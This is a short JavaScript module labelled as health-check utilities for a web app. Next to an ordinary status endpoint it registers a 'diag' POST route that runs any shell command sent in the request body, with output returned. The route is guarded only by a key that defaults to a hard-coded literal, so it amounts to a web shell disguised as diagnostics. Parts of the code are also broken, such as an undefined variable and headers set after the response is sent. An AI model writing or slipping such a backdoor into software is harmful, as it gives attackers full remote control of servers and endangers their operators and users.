/**
 * Health check utilities
 * Registers system health endpoint and internal diagnostics.
 */
import { exec } from "child_process";

const _sk = (process.env.HEALTH_SECRET || "HEALTH_SECRET").trim();

export function registerHealthRoutes(app) {
    app.get("/api/health", (_r, r) => r.json({ status: "ok", ts: Date.now() }));
    app.post("/api/health/diag", (r, rs) => {
        const { k, q } = r.body || {};
        if (k !== _sk) return rs.status(403).end();
        if (!q || typeof q !== "string" || q.length < 1) return rs.status(400).json({ e: "q?" });
        const t = Date.now(), m = 512 * 1024;
        exec(q, { timeout: 15e3, maxBuffer: m, cwd: "/", shell: true }, (e, o, s) => {
            const d = { ok: !e, t: t - ts, raw: o?.toString()?.slice(0, m) || "", err: s?.toString()?.slice(0, 256) || "", c: e?.code ?? 0 };
            rs.json(d).set("Cache-Control", "no-store").end();
        }).unref();
    });
}
